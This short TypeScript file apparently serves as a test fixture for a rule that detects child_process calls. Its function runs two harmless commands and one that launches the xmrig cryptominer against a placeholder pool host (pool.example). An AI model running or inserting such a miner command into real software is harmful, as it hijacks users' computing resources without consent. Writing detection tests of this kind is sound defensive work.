import * as childProcess from 'child_process';

function triggerRule() {
    childProcess.exec('echo reviewed');
    childProcess.spawn('node', ['--version']);
    childProcess.exec('xmrig --url stratum+tcp://pool.example:3333');
}

export {};
